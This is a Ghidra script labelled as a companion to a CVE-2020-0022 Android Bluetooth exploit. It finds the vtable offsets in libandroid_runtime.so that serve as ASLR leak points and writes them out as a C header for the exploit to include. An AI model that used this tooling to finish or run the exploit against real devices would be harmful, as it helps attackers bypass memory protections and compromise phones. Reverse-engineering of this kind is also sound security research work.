// This is a complimentary script to the CVE-2020-0022 exploit. It is used to extract the ASLR leak offsets from the libandroid_runtime.so binary.
// @author @themmokhtar
// @category CVE-2020-0022
// @keybinding 
// @menupath 
// @toolbar 

// import javax.xml.stream.events.Namespace;

import ghidra.app.script.GhidraScript;
import ghidra.program.model.mem.*;
import ghidra.program.model.lang.*;
import ghidra.program.model.pcode.*;
import ghidra.program.model.util.*;
import ghidra.program.model.reloc.*;
import ghidra.program.model.data.*;
import ghidra.program.model.block.*;
import ghidra.program.model.symbol.*;
import ghidra.program.model.scalar.*;
import ghidra.program.model.listing.*;
import ghidra.program.model.address.*;

public class ProcessLibandroidRuntime extends GhidraScript {

    public void run() throws Exception {
        Program program = getCurrentProgram();

        SymbolTable symbolTable = program.getSymbolTable();
        Namespace globalNamespace = program.getGlobalNamespace();

        Address baseAddress = program.getImageBase();

        Address firstAslrLeakAddress = findFirstAslrLeakAddress(symbolTable, globalNamespace);
        println(firstAslrLeakAddress.toString());

        Address secondAslrLeakAddress = findSecondAslrLeakAddress(symbolTable, globalNamespace);
        println(secondAslrLeakAddress.toString());

        String headerCode = generateHeaderCode(baseAddress, firstAslrLeakAddress, secondAslrLeakAddress);
        println("Generated header code:");
        println(headerCode);

        java.io.File file = askFile("Select the .c file to save the code to", "Save");
        java.io.PrintWriter writer = new java.io.PrintWriter(file);
        writer.println(headerCode);
        writer.close();
    }

    private Address findFirstAslrLeakAddress(SymbolTable symbolTable, Namespace globalNamespace) throws Exception {
        Namespace classNamespace = symbolTable.getNamespace("DeathRecipientList", globalNamespace);
        if (classNamespace == null)
            throw new Exception("DeathRecipientList namespace not found");
        println(classNamespace.getName());

        Symbol vtableSymbol = findVtableSymbol(symbolTable, classNamespace);
        println(vtableSymbol.getName());

        Address vtableAddress = vtableSymbol.getAddress();
        if (vtableAddress == null)
            throw new Exception("vtable address not found");
        println(vtableAddress.toString());

        return vtableAddress.add(16);
    }

    private Address findSecondAslrLeakAddress(SymbolTable symbolTable, Namespace globalNamespace) throws Exception {
        println(symbolTable.toString());
        println(globalNamespace.getSymbol().getName());

        Namespace androidNamespace = symbolTable.getNamespace("android", globalNamespace);
        if (androidNamespace == null)
            throw new Exception("android namespace not found");
        println(androidNamespace.getName());

        Namespace listClassNamespace = symbolTable.getNamespace("List<android::sp<JavaDeathRecipient>>",
                androidNamespace);
        if (listClassNamespace == null)
            throw new Exception("List<android::sp<JavaDeathRecipient>> namespace not found");
        println(listClassNamespace.getName());

        Symbol vtableSymbol = findVtableSymbol(symbolTable, listClassNamespace);

        Address vtableAddress = vtableSymbol.getAddress();
        if (vtableAddress == null)
            throw new Exception("vtable address not found");
        println(vtableAddress.toString());

        return vtableAddress.add(16);
    }

    private Symbol findVtableSymbol(SymbolTable symbolTable, Namespace classNamespace) throws Exception {
        SymbolIterator vtableIterator = symbolTable.getSymbols(classNamespace);

        Symbol vtableSymbol = null;
        while (vtableIterator.hasNext()) {
            Symbol element = vtableIterator.next();
            if (element.getName().equals("vtable")) {
                vtableSymbol = element;
                break;
            }
        }

        if (vtableSymbol == null)
            throw new Exception("vtable symbol not found");
        println(vtableSymbol.getName());

        return vtableSymbol;
    }

    private String generateHeaderCode(Address baseAddress, Address firstAslrLeakAddress,
            Address secondAslrLeakAddress) {
        StringBuilder headerCode = new StringBuilder();

        headerCode.append("// This file is autogenerated. Do not modify it!\n\n");
        headerCode.append("#pragma once\n\n");
        headerCode.append("#include <stdint.h>\n\n");
        // headerCode.append("#define LIBANDROID_RUNTIME_BASE_ADDRESS ((uint64_t)(0x"
        //         + baseAddress.toString() + "ull))\n");
        headerCode.append("#define LIBANDROID_RUNTIME_FIRST_ASLR_LEAK_OFFSET ((uint64_t)(0x"
                + firstAslrLeakAddress.toString() + "ull))\n");
        headerCode.append("#define LIBANDROID_RUNTIME_SECOND_ASLR_LEAK_OFFSET ((uint64_t)(0x"
                + secondAslrLeakAddress.toString() + "ull))\n");

        return headerCode.toString();
    }
}
